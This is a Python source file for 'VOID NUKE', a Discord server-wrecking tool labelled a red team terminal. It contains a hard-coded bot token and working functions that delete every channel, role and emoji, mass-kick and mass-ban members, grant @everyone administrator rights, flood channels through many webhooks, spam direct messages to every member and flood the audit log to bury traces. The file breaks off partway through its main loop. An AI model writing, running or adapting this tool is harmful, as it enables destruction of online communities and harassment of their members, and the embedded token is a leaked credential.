#!/usr/bin/env python3
"""
VOID NUKE v2.0 — Discord Red Team Terminal
Authorized penetration testing and red team operations only.
"""

import asyncio
import sys
import time
import threading
import collections

for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet"),("aiohttp","aiohttp")]:
    try: __import__(mod)
    except ImportError:
        print(f"Missing: pip install {pkg}"); sys.exit(1)

import aiohttp
import pyfiglet
from rich.console import Console
from rich.rule    import Rule
from rich.panel   import Panel
from rich.table   import Table
from rich.text    import Text
from rich.live    import Live
from rich         import box
from rich.console import Group

console = Console(highlight=False)

# ── Token ─────────────────────────────────────────────────────────────────────
TOKEN    = "MTQ2NjA5MTMwMTczNTg5NTA3MQ.GWGsgX.C6FePQLk4Y8ibLUwAJf7BIfawlOMbp0ZdOt_oM"
BASE_URL = "https://discord.com/api/v10"
HDRS     = {
    "Authorization": f"Bot {TOKEN}",
    "Content-Type":  "application/json",
    "User-Agent":    "DiscordBot (void, 2.0)",
    "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCJ9",
}

NUKE_MSG = "# ☢️ @everyone @here **SERVER NUKED BY VOID** ☢️\nhttps://discord.gg/void"
NUKE_CH  = "☢︱void-nuked-you"

# ═════════════════════════════════════════════════════════════════════════════
# STATS — thread-safe live counters
# ═════════════════════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self._l     = threading.Lock()
        self.done   = 0
        self.failed = 0
        self.rls    = 0
        self.total  = 0
        self._hist  = collections.deque(maxlen=60)  # (ts, done) for ops/s
        self._start = time.time()

    def ok(self, n=1):
        with self._l:
            self.done += n
            self._hist.append((time.monotonic(), self.done))

    def fail(self, n=1):
        with self._l: self.failed += n

    def rl(self, n=1):
        with self._l: self.rls += n

    def set_total(self, n):
        with self._l: self.total = n

    def ops_per_sec(self):
        with self._l:
            if len(self._hist) < 2: return 0
            t0, d0 = self._hist[0]
            t1, d1 = self._hist[-1]
            dt = t1 - t0
            return (d1 - d0) / dt if dt > 0 else 0

    def elapsed(self): return time.time() - self._start
    def eta(self):
        ops = self.ops_per_sec()
        if not ops or not self.total: return "?"
        remaining = self.total - self.done
        return f"{remaining/ops:.0f}s"

    def reset(self):
        with self._l:
            self.done = self.failed = self.rls = self.total = 0
            self._hist.clear()
            self._start = time.time()

ST = Stats()

# ═════════════════════════════════════════════════════════════════════════════
# RATE LIMITER — per-bucket tracking, global pause event
# ═════════════════════════════════════════════════════════════════════════════
class RateLimiter:
    """
    Reads X-RateLimit-* headers from every response and tracks per-bucket state.
    Proactively waits when remaining==0 BEFORE the request — eliminates wasted
    429 round-trips. Also handles X-RateLimit-Global to pause all workers.
    """
    def __init__(self):
        self._buckets: dict[str, float] = {}      # bucket_id → reset monotonic ts
        self._remaining: dict[str, int] = {}       # bucket_id → remaining count
        self._route_bucket: dict[str, str] = {}    # route → bucket_id (learned)
        self._global_ready = asyncio.Event()
        self._global_ready.set()                   # starts unblocked
        self._lock = asyncio.Lock()

    def _bucket_key(self, path: str) -> str:
        """Return cached bucket id for a route, or the route itself as fallback."""
        return self._route_bucket.get(path, path)

    async def pre_request(self, path: str):
        """Wait if the route's bucket is currently exhausted or global is blocked."""
        await self._global_ready.wait()
        bk = self._bucket_key(path)
        async with self._lock:
            rem = self._remaining.get(bk, 1)
            if rem <= 0:
                reset_at = self._buckets.get(bk, 0)
                wait = reset_at - time.monotonic()
                if wait > 0:
                    # Release lock while sleeping so other routes can proceed
                    pass
                else:
                    # Bucket has reset — clear it
                    self._remaining.pop(bk, None)
                    self._buckets.pop(bk, None)
                    return
            else:
                return
        if wait > 0:
            await asyncio.sleep(wait + 0.01)

    def update(self, path: str, resp: aiohttp.ClientResponse):
        h = resp.headers
        bucket    = h.get("X-RateLimit-Bucket")
        remaining = h.get("X-RateLimit-Remaining")
        reset_aft = h.get("X-RateLimit-Reset-After")
        is_global = h.get("X-RateLimit-Global") == "true"

        if is_global and reset_aft:
            self._global_ready.clear()
            wait = float(reset_aft)
            asyncio.get_event_loop().call_later(wait, self._global_ready.set)

        if bucket:
            self._route_bucket[path] = bucket
            if remaining is not None:
                self._remaining[bucket] = int(remaining)
            if reset_aft is not None:
                self._buckets[bucket] = time.monotonic() + float(reset_aft)

    async def handle_429(self, resp: aiohttp.ClientResponse, data: dict):
        ST.rl()
        wait      = float(data.get("retry_after", 1.0))
        is_global = resp.headers.get("X-RateLimit-Global") == "true"
        if is_global:
            self._global_ready.clear()
            await asyncio.sleep(wait)
            self._global_ready.set()
        else:
            await asyncio.sleep(wait)

RL = RateLimiter()

# ═════════════════════════════════════════════════════════════════════════════
# HTTP ENGINE
# ═════════════════════════════════════════════════════════════════════════════
_SESSION: aiohttp.ClientSession | None = None

def _make_connector():
    return aiohttp.TCPConnector(
        limit          = 0,              # unlimited simultaneous connections
        ttl_dns_cache  = 300,
        enable_cleanup_closed = True,
    )

async def _req(method: str, path: str, json: dict = None,
               retries: int = 12) -> dict | None:
    """
    Bucket-aware Discord API request.
    • Checks RL state BEFORE firing — avoids 429 round-trips.
    • Reads response headers and updates RL state AFTER every response.
    • On 429: sleeps only the exact retry_after, then retries immediately.
    """
    global _SESSION
    url = f"{BASE_URL}{path}"
    for attempt in range(retries):
        await RL.pre_request(path)
        try:
            async with _SESSION.request(method, url, headers=HDRS, json=json) as resp:
                RL.update(path, resp)
                if resp.status == 204:
                    ST.ok(); return {}
                if resp.status == 429:
                    data = await resp.json(content_type=None)
                    await RL.handle_429(resp, data)
                    continue
                if resp.status in (200, 201):
                    ST.ok()
                    return await resp.json(content_type=None)
                if resp.status in (400, 403, 404, 401):
                    ST.fail(); return None
                await asyncio.sleep(min(0.4 * (attempt + 1), 3.0))
        except (aiohttp.ClientError, asyncio.TimeoutError):
            await asyncio.sleep(0.2)
        except Exception:
            await asyncio.sleep(0.3)
    ST.fail(); return None

async def _req_wh(url: str, content: str, retries: int = 8) -> bool:
    """Webhook-specific POST — separate from bot routes, own bucket."""
    for _ in range(retries):
        try:
            async with _SESSION.post(url, json={"content": content},
                                     headers={"Content-Type":"application/json"}) as r:
                if r.status in (200, 204): ST.ok(); return True
                if r.status == 429:
                    d = await r.json(content_type=None)
                    await asyncio.sleep(float(d.get("retry_after", 1.0)))
                    continue
                if r.status in (400, 401, 403, 404): ST.fail(); return False
        except Exception:
            await asyncio.sleep(0.2)
    ST.fail(); return False

# ═════════════════════════════════════════════════════════════════════════════
# WORKER POOL — queue-based, N concurrent workers draining tasks
# ═════════════════════════════════════════════════════════════════════════════
async def _pool(coros, n_workers: int = 100):
    """
    Drain a list of coroutines through N parallel workers.
    Better than gather+semaphore for 1000+ tasks: workers stay busy without
    building a massive coroutine object pile.
    """
    q: asyncio.Queue = asyncio.Queue()
    for c in coros:
        await q.put(c)

    async def _worker():
        while True:
            try:
                coro = q.get_nowait()
            except asyncio.QueueEmpty:
                break
            try:
                await coro
            except Exception:
                pass
            q.task_done()

    workers = [asyncio.create_task(_worker()) for _ in range(min(n_workers, len(coros)+1))]
    await asyncio.gather(*workers, return_exceptions=True)

# ═════════════════════════════════════════════════════════════════════════════
# LIVE PROGRESS PANEL
# ═════════════════════════════════════════════════════════════════════════════
def _progress_panel(label: str, color: str) -> Panel:
    done   = ST.done
    failed = ST.failed
    rls    = ST.rls
    total  = ST.total or 1
    ops    = ST.ops_per_sec()
    ela    = ST.elapsed()
    pct    = min(done / total, 1.0)

    bar_w  = 36
    filled = int(pct * bar_w)
    bar    = Text()
    bar.append("█" * filled,           style=color)
    bar.append("░" * (bar_w - filled), style="dim")

    grid = Table.grid(padding=(0,2))
    grid.add_column(min_width=10, style="dim")
    grid.add_column(min_width=18, style="bold white")
    grid.add_column(min_width=10, style="dim")
    grid.add_column(min_width=14, style="bold white")
    grid.add_row("DONE",    f"{done:,} / {total:,}", "RATE",   f"{ops:,.0f} /s")
    grid.add_row("FAILED",  str(failed),              "RL HITS", str(rls))
    grid.add_row("ELAPSED", f"{ela:.0f}s",            "ETA",    ST.eta())

    prog_row = Text()
    prog_row.append("  ")
    prog_row.append_text(bar)
    prog_row.append(f"  {pct*100:.0f}%", style=f"bold {color}")

    return Panel(
        Group(grid, Text(""), prog_row),
        title=f"[bold {color}]  {label}  [/]",
        border_style=color, box=box.DOUBLE_EDGE,
    )

async def _live_pool(coros, n_workers: int, label: str, color: str):
    """Run _pool while showing a live progress panel."""
    ST.set_total(len(coros))
    q: asyncio.Queue = asyncio.Queue()
    for c in coros:
        await q.put(c)

    async def _worker():
        while True:
            try: coro = q.get_nowait()
            except asyncio.QueueEmpty: break
            try: await coro
            except Exception: pass
            q.task_done()

    tasks = [asyncio.create_task(_worker())
             for _ in range(min(n_workers, len(coros)+1))]

    with Live(console=console, refresh_per_second=4, transient=True) as live:
        while any(not t.done() for t in tasks):
            live.update(_progress_panel(label, color))
            await asyncio.sleep(0.25)
        live.update(_progress_panel(label, color))

    await asyncio.gather(*tasks, return_exceptions=True)

# ═════════════════════════════════════════════════════════════════════════════
# API HELPERS
# ═════════════════════════════════════════════════════════════════════════════
async def api_guild(gid):          return await _req("GET", f"/guilds/{gid}?with_counts=true")
async def api_channels(gid):       return await _req("GET", f"/guilds/{gid}/channels") or []
async def api_roles(gid):          return await _req("GET", f"/guilds/{gid}/roles")    or []
async def api_emojis(gid):         return await _req("GET", f"/guilds/{gid}/emojis")   or []
async def api_self():              return await _req("GET", "/users/@me")

async def api_members(gid):
    """Paginate all members — each page up to 1000, sequential (API limit)."""
    out, after = [], 0
    while True:
        chunk = await _req("GET", f"/guilds/{gid}/members?limit=1000&after={after}") or []
        if not chunk: break
        out.extend(chunk)
        if len(chunk) < 1000: break
        after = chunk[-1]["user"]["id"]
    return out

async def del_channel(cid):        return await _req("DELETE", f"/channels/{cid}")
async def del_role(gid, rid):      return await _req("DELETE", f"/guilds/{gid}/roles/{rid}")
async def del_emoji(gid, eid):     return await _req("DELETE", f"/guilds/{gid}/emojis/{eid}")
async def kick(gid, uid):          return await _req("DELETE", f"/guilds/{gid}/members/{uid}")
async def ban(gid, uid):           return await _req("PUT",    f"/guilds/{gid}/bans/{uid}",
                                                     json={"delete_message_days":0})
async def nick(gid, uid, n):       return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
                                                     json={"nick":n})
async def mute_m(gid, uid, v):     return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
                                                     json={"mute":v})
async def deaf_m(gid, uid, v):     return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
                                                     json={"deaf":v})
async def disc_m(gid, uid):        return await _req("PATCH",  f"/guilds/{gid}/members/{uid}",
                                                     json={"channel_id":None})
async def send_msg(cid, txt):      return await _req("POST",   f"/channels/{cid}/messages",
                                                     json={"content":txt})
async def mk_channel(gid, name, t=0):
    return await _req("POST", f"/guilds/{gid}/channels", json={"name":name,"type":t})
async def mk_thread(cid, name):
    return await _req("POST", f"/channels/{cid}/threads",
                      json={"name":name,"auto_archive_duration":60,"type":12})
async def mk_webhook(cid, name="void"):
    return await _req("POST", f"/channels/{cid}/webhooks", json={"name":name})
async def ch_perms(cid, oid, allow, deny):
    return await _req("PUT", f"/channels/{cid}/permissions/{oid}",
                      json={"allow":str(allow),"deny":str(deny),"type":0})
async def edit_guild(gid, **kw):   return await _req("PATCH", f"/guilds/{gid}", json=kw)
async def dm_open(uid):            return await _req("POST",  "/users/@me/channels",
                                                     json={"recipient_id":str(uid)})

# ═════════════════════════════════════════════════════════════════════════════
# WEBHOOK FLOOD ENGINE
# ═════════════════════════════════════════════════════════════════════════════
async def _flood_via_webhooks(channels: list, msg: str,
                              webhooks_per_channel: int = 6,
                              rounds: int = 50):
    """
    Fastest possible message flood:
    • Create N webhooks per channel (each has its OWN rate limit bucket)
    • All webhooks fire in parallel — no shared bucket contention
    • N=6 webhooks × 30msg/60s each = 3 msg/s per channel sustained
    • With 50 channels × 6 webhooks = 300 independent message streams
    """
    _status(f"Creating webhooks ({webhooks_per_channel}/channel across {len(channels)} channels)…")
    wh_tasks = []
    for ch in channels:
        for _ in range(webhooks_per_channel):
            wh_tasks.append(mk_webhook(ch["id"]))

    webhook_results = await asyncio.gather(*wh_tasks, return_exceptions=True)
    webhooks = [w for w in webhook_results
                if isinstance(w, dict) and w.get("id") and w.get("token")]

    if not webhooks:
        _fail("No webhooks created — falling back to bot messages")
        await _live_pool(
            [send_msg(c["id"], msg) for c in channels for _ in range(rounds)],
            n_workers=200, label="MESSAGE FLOOD", color="bright_red"
        )
        return

    _status(f"{len(webhooks)} webhooks ready — flooding {rounds} rounds each…")

    wh_urls = [f"https://discord.com/api/webhooks/{w['id']}/{w['token']}"
               for w in webhooks]

    ST.set_total(len(wh_urls) * rounds)
    ST.done = 0

    async def _fire_webhook(url: str):
        for _ in range(rounds):
            await _req_wh(url, msg)
            await asyncio.sleep(0.05)   # tiny pause between rounds on same webhook

    with Live(console=console, refresh_per_second=4, transient=True) as live:
        tasks = [asyncio.create_task(_fire_webhook(u)) for u in wh_urls]
        while any(not t.done() for t in tasks):
            live.update(_progress_panel("WEBHOOK FLOOD", "bright_red"))
            await asyncio.sleep(0.25)
        live.update(_progress_panel("WEBHOOK FLOOD", "bright_red"))
    await asyncio.gather(*tasks, return_exceptions=True)

# ═════════════════════════════════════════════════════════════════════════════
# OPERATIONS
# ═════════════════════════════════════════════════════════════════════════════

async def op_full_nuke(gid, _=None):
    """
    Maximum-speed full nuke:
    Phase 1 — parallel: delete all channels + fetch members/roles (overlap)
    Phase 2 — parallel: rename server + kick everyone + create 50 new channels
    Phase 3 — webhook flood on new channels (300 independent streams)
    """
    _status("Phase 1 — fetching data + deleting channels in parallel…")
    channels, members, roles, me = await asyncio.gather(
        api_channels(gid), api_members(gid), api_roles(gid), api_self()
    )

    # Delete channels and rename concurrently
    del_tasks  = [del_channel(c["id"]) for c in channels]
    ST.set_total(len(del_tasks))
    rename_t   = asyncio.create_task(edit_guild(gid, name="☢ VOID NUKED ☢"))

    await _live_pool(del_tasks, n_workers=500, label="DELETING CHANNELS", color="bright_red")
    await rename_t

    _status("Phase 2 — kicking members + creating flood channels in parallel…")
    bot_id = me["id"] if me else None
    targets = [m for m in members if not m["user"].get("bot")
               and m["user"]["id"] != bot_id]

    kick_tasks = [kick(gid, m["user"]["id"]) for m in targets]
    ch_tasks   = [mk_channel(gid, NUKE_CH) for _ in range(50)]

    # Fire both simultaneously
    kick_job = asyncio.create_task(_live_pool(
        kick_tasks, n_workers=500, label="KICKING MEMBERS", color="red"))
    ch_results = await asyncio.gather(*ch_tasks, return_exceptions=True)
    new_channels = [r for r in ch_results if isinstance(r, dict) and r.get("id")]
    await kick_job

    _status(f"Phase 3 — webhook flood on {len(new_channels)} channels…")
    if new_channels:
        await _flood_via_webhooks(new_channels, NUKE_MSG,
                                  webhooks_per_channel=6, rounds=40)
    _ok(f"Full nuke complete — {len(new_channels)} channels flooded")


async def op_bypass(gid, _=None):
    """Kick bots + strip roles + @everyone admin — all parallel."""
    _status("Fetching data…")
    members, roles, me = await asyncio.gather(
        api_members(gid), api_roles(gid), api_self()
    )
    bot_id = me["id"] if me else None
    bots   = [m for m in members if m["user"].get("bot") and m["user"]["id"] != bot_id]

    strip_tasks = [
        _req("PATCH", f"/guilds/{gid}/roles/{r['id']}", json={"permissions":"0"})
        for r in roles if r["id"] != str(gid) and not r.get("managed")
    ]
    kick_tasks  = [kick(gid, m["user"]["id"]) for m in bots]

    await asyncio.gather(
        _live_pool(strip_tasks, 100, "STRIPPING ROLES",  "yellow"),
        _pool(kick_tasks, 200),
        return_exceptions=True,
    )
    await _req("PATCH", f"/guilds/{gid}/roles/{gid}", json={"permissions":"8"})
    _ok(f"Bypass done — {len(bots)} bots kicked, {len(strip_tasks)} roles stripped, @everyone admined")


async def op_mass_channel(gid, _=None):
    """Create 50 channels then webhook-flood them."""
    _status("Creating 50 channels…")
    results  = await asyncio.gather(*[mk_channel(gid, NUKE_CH) for _ in range(50)],
                                    return_exceptions=True)
    created  = [r for r in results if isinstance(r, dict) and r.get("id")]
    if created:
        await _flood_via_webhooks(created, NUKE_MSG, webhooks_per_channel=6, rounds=30)
    _ok(f"Mass channel done — {len(created)} channels flooded")


async def op_mass_kick(gid, _=None):
    _status("Fetching members…")
    members, me = await asyncio.gather(api_members(gid), api_self())
    bid   = me["id"] if me else None
    targets = [m for m in members if not m["user"].get("bot") and m["user"]["id"] != bid]
    # Each user = separate bucket → max concurrency, no bucket contention
    await _live_pool([kick(gid, m["user"]["id"]) for m in targets],
                     n_workers=500, label="MASS KICK", color="bright_red")
    _ok(f"Mass kick — {ST.done} kicked, {ST.failed} failed")


async def op_mass_ban(gid, _=None):
    _status("Fetching members…")
    members, me = await asyncio.gather(api_members(gid), api_self())
    bid   = me["id"] if me else None
    targets = [m for m in members if not m["user"].get("bot") and m["user"]["id"] != bid]
    await _live_pool([ban(gid, m["user"]["id"]) for m in targets],
                     n_workers=500, label="MASS BAN", color="bright_red")
    _ok(f"Mass ban — {ST.done} banned, {ST.failed} failed")


async def op_role_wipe(gid, _=None):
    roles = await api_roles(gid)
    tasks = [del_role(gid, r["id"]) for r in roles
             if r["id"] != str(gid) and not r.get("managed")]
    await _live_pool(tasks, n_workers=100, label="ROLE WIPE", color="yellow")
    _ok(f"Role wipe — {ST.done} deleted")


async def op_emoji_wipe(gid, _=None):
    emojis = await api_emojis(gid)
    await _live_pool([del_emoji(gid, e["id"]) for e in emojis],
                     n_workers=50, label="EMOJI WIPE", color="yellow")
    _ok(f"Emoji wipe — {ST.done} deleted")


async def op_nick_all(gid, extra=None):
    name = extra or "☢ VOID NUKED ☢"
    _status("Fetching members…")
    members, me = await asyncio.gather(api_members(gid), api_self())
    bid = me["id"] if me else None
    targets = [m for m in members if m["user"]["id"] != bid]
    # Each user = separate bucket → 500 workers, no contention
    await _live_pool([nick(gid, m["user"]["id"], name) for m in targets],
                     n_workers=500, label="NICK ALL", color="bright_yellow")
    _ok(f"Nick all — {ST.done} renamed")


async def op_lockdown(gid, _=None):
    channels = await api_channels(gid)
    # Deny VIEW_CHANNEL (1024) for @everyone — each channel = separate bucket
    await _live_pool([ch_perms(c["id"], gid, 0, 1024) for c in channels],
                     n_workers=500, label="LOCKDOWN", color="bright_magenta")
    _ok(f"Lockdown — {ST.done} channels hidden")


async def op_ghost(gid, _=None):
    """Rapid create+delete cycle — glitches sidebar for all members."""
    _status("Running ghost loop (100 cycles)…")
    async def _cycle():
        ch = await mk_channel(gid, "​")   # zero-width space name
        if ch and ch.get("id"):
            await asyncio.sleep(0.5)
            await del_channel(ch["id"])
    await _pool([_cycle() for _ in range(100)], n_workers=20)
    _ok("Ghost loop done")


async def op_thread_raid(gid, _=None):
    """50 private threads per channel — all in parallel."""
    channels = await api_channels(gid)
    text_chs = [c for c in channels if c["type"] == 0]
    tasks    = [mk_thread(c["id"], f"void-{i}")
                for c in text_chs for i in range(50)]
    await _live_pool(tasks, n_workers=200, label="THREAD RAID", color="cyan")
    _ok(f"Thread raid — {ST.done} threads created")


async def op_audit_wipe(gid, _=None):
    """Create+delete threads in burst — floods audit log. Runs 90 seconds."""
    channels = await api_channels(gid)
    text_chs = [c for c in channels if c["type"] == 0][:8]
    if not text_chs:
        _fail("No text channels"); return
    _status("Audit wipe running for 90s — Ctrl+C to stop…")
    deadline = time.monotonic() + 90

    async def _lane(cid):
        while time.monotonic() < deadline:
            t = await mk_thread(cid, ".")
            if t and t.get("id"):
                await asyncio.sleep(0.15)
                await del_channel(t["id"])
            await asyncio.sleep(0.05)

    await asyncio.gather(*[_lane(c["id"]) for c in text_chs], return_exceptions=True)
    _ok("Audit wipe done")


async def op_rename_server(gid, extra=None):
    name = extra or "☢ VOID NUKED ☢"
    await edit_guild(gid, name=name)
    _ok(f"Server renamed → {name}")


async def op_webhook_spam(gid, _=None):
    """Webhook flood on every existing channel."""
    channels = await api_channels(gid)
    text_chs = [c for c in channels if c["type"] == 0]
    await _flood_via_webhooks(text_chs, NUKE_MSG, webhooks_per_channel=6, rounds=50)
    _ok(f"Webhook spam done — {ST.done} messages sent")


async def op_dm_spam(gid, extra=None):
    if not extra:
        console.print("  [red]Format: USER_ID,message[/]"); return
    parts = extra.split(",", 1)
    if len(parts) < 2:
        console.print("  [red]Format: USER_ID,message[/]"); return
    uid, msg = parts[0].strip(), parts[1].strip()
    dm  = await dm_open(uid)
    if not dm:
        _fail("Could not open DM channel"); return
    cid = dm["id"]
    await _live_pool([send_msg(cid, msg) for _ in range(300)],
                     n_workers=15, label="DM SPAM", color="bright_green")
    _ok(f"DM spam — {ST.done} messages sent")


async def op_dm_all(gid, extra=None):
    msg = extra or NUKE_MSG
    _status("Fetching members…")
    members = await api_members(gid)
    non_bot = [m for m in members if not m["user"].get("bot")]

    async def _dm_one(uid):
        dm = await dm_open(uid)
        if dm:
            await send_msg(dm["id"], msg)

    await _live_pool([_dm_one(m["user"]["id"]) for m in non_bot],
                     n_workers=10, label="DM ALL", color="bright_green")
    _ok(f"DM all — {ST.done} sent")


async def op_mute_all(gid, _=None):
    members = await api_members(gid)
    await _live_pool([mute_m(gid, m["user"]["id"], True) for m in members],
                     n_workers=500, label="MUTE ALL", color="bright_cyan")
    _ok(f"Muted {ST.done}")

async def op_deafen_all(gid, _=None):
    members = await api_members(gid)
    await _live_pool([deaf_m(gid, m["user"]["id"], True) for m in members],
                     n_workers=500, label="DEAFEN ALL", color="bright_cyan")
    _ok(f"Deafened {ST.done}")

async def op_disc_all(gid, _=None):
    members = await api_members(gid)
    await _live_pool([disc_m(gid, m["user"]["id"]) for m in members],
                     n_workers=500, label="DISCONNECT ALL", color="bright_cyan")
    _ok(f"Disconnected {ST.done}")


async def op_server_info(gid, _=None):
    g, chs, roles = await asyncio.gather(api_guild(gid), api_channels(gid), api_roles(gid))
    if not g: _fail("Cannot fetch guild"); return
    t = Table.grid(padding=(0,3))
    t.add_column(style="dim"); t.add_column(style="bold white")
    t.add_row("Name",     g.get("name","?"))
    t.add_row("ID",       str(g.get("id","?")))
    t.add_row("Owner ID", str(g.get("owner_id","?")))
    t.add_row("Members",  str(g.get("approximate_member_count","?")))
    t.add_row("Channels", str(len(chs)))
    t.add_row("Roles",    str(len(roles)))
    t.add_row("2FA",      str(g.get("mfa_level","?")))
    t.add_row("Verified", str(g.get("verified",False)))
    console.print(Panel(t, title="[bold yellow]  SERVER INFO  [/]",
                        border_style="yellow", box=box.DOUBLE_EDGE))


async def op_user_info(gid, extra=None):
    uid  = extra or input("  User ID: ").strip()
    user = await _req("GET", f"/users/{uid}")
    if not user: _fail("Cannot fetch user"); return
    t = Table.grid(padding=(0,3))
    t.add_column(style="dim"); t.add_column(style="bold white")
    t.add_row("Username", f"{user.get('username','?')}#{user.get('discriminator','0')}")
    t.add_row("ID",       str(user.get("id","?")))
    t.add_row("Bot",      str(user.get("bot",False)))
    if gid:
        m = await _req("GET", f"/guilds/{gid}/members/{uid}")
        if m:
            t.add_row("Nickname", m.get("nick") or "—")
            t.add_row("Joined",   m.get("joined_at","?")[:10])
            roles = m.get("roles",[])
            t.add_row("Roles", str(len(roles)))
    console.print(Panel(t, title="[bold cyan]  USER INFO  [/]",
                        border_style="cyan", box=box.DOUBLE_EDGE))


# ═════════════════════════════════════════════════════════════════════════════
# MENU
# ═════════════════════════════════════════════════════════════════════════════
MENU = [
    # (key, label, color, needs_guild, needs_extra, extra_prompt, desc, handler)
    ("1",  "Full Nuke",      "bright_red",     True,  False, None,
     "Delete all + rename + kick all + create 50 ch + webhook flood",  op_full_nuke),
    ("2",  "Bypass",         "red",            True,  False, None,
     "Kick bots, strip all roles, grant @everyone admin",              op_bypass),
    ("3",  "Mass Channel",   "bright_red",     True,  False, None,
     "Create 50 channels and webhook-flood them",                      op_mass_channel),
    ("4",  "Mass Kick",      "red",            True,  False, None,
     "Kick every non-bot member (500 parallel workers)",               op_mass_kick),
    ("5",  "Mass Ban",       "bright_red",     True,  False, None,
     "Permanently ban every non-bot member (500 workers)",             op_mass_ban),
    ("6",  "Role Wipe",      "yellow",         True,  False, None,
     "Delete every non-managed role",                                  op_role_wipe),
    ("7",  "Emoji Wipe",     "yellow",         True,  False, None,
     "Delete every emoji",                                             op_emoji_wipe),
    ("8",  "Nick All",       "bright_yellow",  True,  True,  "Nickname (blank = ☢ VOID NUKED ☢): ",
     "Rename every member (500 parallel workers)",                     op_nick_all),
    ("9",  "Lockdown",       "bright_magenta", True,  False, None,
     "Hide all channels from @everyone (500 workers)",                 op_lockdown),
    ("10", "Ghost Mode",     "bright_cyan",    True,  False, None,
     "100 rapid create/delete cycles — glitches sidebar",             op_ghost),
    ("11", "Thread Raid",    "cyan",           True,  False, None,
     "50 private threads per channel (200 workers)",                   op_thread_raid),
    ("12", "Audit Wipe",     "dim",            True,  False, None,
     "Thread create/delete loop floods audit log for 90s",            op_audit_wipe),
    ("13", "Rename Server",  "bright_yellow",  True,  True,  "New name: ",
     "Rename the server",                                              op_rename_server),
    ("14", "Webhook Spam",   "bright_green",   True,  False, None,
     "6 webhooks/channel × 50 rounds (300 parallel streams)",         op_webhook_spam),
    ("15", "DM Spam",        "bright_green",   False, True,  "USER_ID,message: ",
     "300 DMs to one user",                                            op_dm_spam),
    ("16", "DM All",         "bright_green",   True,  True,  "Message (blank = nuke msg): ",
     "DM every member in the server",                                  op_dm_all),
    ("17", "Mute All",       "bright_cyan",    True,  False, None,
     "Server-mute all members (500 workers)",                          op_mute_all),
    ("18", "Deafen All",     "bright_cyan",    True,  False, None,
     "Server-deafen all members (500 workers)",                        op_deafen_all),
    ("19", "Disconnect All", "bright_cyan",    True,  False, None,
     "Disconnect all from voice (500 workers)",                        op_disc_all),
    ("20", "Server Info",    "bright_white",   True,  False, None,
     "Dump server intelligence",                                       op_server_info),
    ("21", "User Info",      "bright_white",   False, True,  "User ID (blank to prompt): ",
     "Dump user intelligence",                                         op_user_info),
]

SECTIONS = [
    ("SERVER DESTRUCTION",  [str(i) for i in range(1,15)]),
    ("DM OPERATIONS",       ["15","16"]),
    ("VOICE OPERATIONS",    ["17","18","19"]),
    ("INTELLIGENCE",        ["20","21"]),
]

# ═════════════════════════════════════════════════════════════════════════════
# UI
# ═════════════════════════════════════════════════════════════════════════════
def _status(msg): console.print(f"  [dim]›[/]  {msg}")
def _ok(msg):     console.print(f"  [bold bright_green][✓][/]  {msg}")
def _fail(msg):   console.print(f"  [bold red][✗][/]  {msg}")

def _banner():
    console.clear()
    fig   = pyfiglet.figlet_format("VOID  NUKE", font="doom")
    shade = ["bright_red","red","bright_red","red","bright_red","red"]
    for i, line in enumerate(fig.splitlines()):
        console.print(f"  [{shade[i%len(shade)]}]{line}[/]")
    console.print()
    console.print(Rule(
        "[dim red]  VOID NUKE v2.0  ·  Discord Red Team Terminal  ·  Authorized Use Only  [/]",
        style="dim red"))
    console.print()

def _menu(me_name: str, me_id: str, guild_id: str | None):
    _banner()
    console.print(f"  [dim]Bot:[/]  [bold yellow]{me_name}[/]  [dim]({me_id})[/]  "
                  + (f"  [dim]│[/]  Server: [bold yellow]{guild_id}[/]" if guild_id
                     else "  [dim]│  No server selected[/]"))
    console.print(f"  [dim]Type  S  to set/change server[/]\n")

    for sec_name, keys in SECTIONS:
        items = [m for m in MENU if m[0] in keys]
        console.print(f"  [dim]{sec_name}[/]")
        console.print(f"  {'─'*68}")
        for key, label, color, *_, desc, _fn in items:
            console.print(f"  [{color}]{key:>2}[/]  [bold white]{label:<16}[/]  [dim]{desc}[/]")
        console.print()

    console.print(f"  [dim]{'─'*68}[/]")
    console.print(f"  [dim]  0   Exit[/]\n")


async def _run(choice: str, guild_id: str | None):
    entry = next((m for m in MENU if m[0] == choice), None)
    if not entry:
        _fail(f"Unknown: {choice}"); return

    key, label, color, needs_guild, needs_extra, ex_prompt, desc, handler = entry

    if needs_guild and not guild_id:
        guild_id = input("  Server ID: ").strip()
    extra = None
    if needs_extra:
        prompt = ex_prompt or "Input: "
        extra  = input(f"  {prompt}").strip() or None

    ST.reset()
    console.print()
    console.print(Rule(f"[bold {color}]  {label.upper()}  [/]", style=color))
    console.print()

    t0 = time.time()
    try:
        await handler(guild_id, extra)
    except KeyboardInterrupt:
        _fail("Stopped by user.")
    except Exception as e:
        _fail(f"Error: {e}")

    ela = time.time() - t0
    console.print()
    tbl = Table.grid(padding=(0,3))
    tbl.add_column(style="dim"); tbl.add_column(style="bold white")
    tbl.add_row("Operation", label)
    tbl.add_row("Completed", f"{ST.done:,}")
    tbl.add_row("Failed",    f"{ST.failed:,}")
    tbl.add_row("RL hits",   f"{ST.rls:,}")
    tbl.add_row("Duration",  f"{ela:.1f}s")
    tbl.add_row("Avg rate",  f"{ST.done/ela:.0f} ops/s" if ela else "—")
    console.print(Panel(tbl, title=f"[bold {color}]  DONE  [/]",
                        border_style=color, box=box.DOUBLE_EDGE))
    console.print()

# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════
async def main():
    global _SESSION
    conn     = _make_connector()
    timeout  = aiohttp.ClientTimeout(total=15, connect=5)
    _SESSION = aiohttp.ClientSession(connector=conn, timeout=timeout)

    _banner()
    _status("Verifying token…")
    me = await api_self()
    if not me:
        _fail("Invalid token or no network.")
        await _SESSION.close()
        sys.exit(1)

    me_name = me.get("username","?")
    me_id   = me.get("id","?")
    console.print(f"  [bold bright_green][✓][/]  [bold yellow]{me_name}[/]  [dim]({me_id})[/]\n")
    await asyncio.sleep(0.8)

    guild_id = None

    try:
        while True:
            _menu(me_name, me_id, guild_id)
            try:
                raw = input("  Choice: ").strip()
            except (EOFError, KeyboardInterrupt):
                break

            if raw == "0":        break
            if raw.upper() == "S":
                guild_id = input("  Server ID: ").strip()
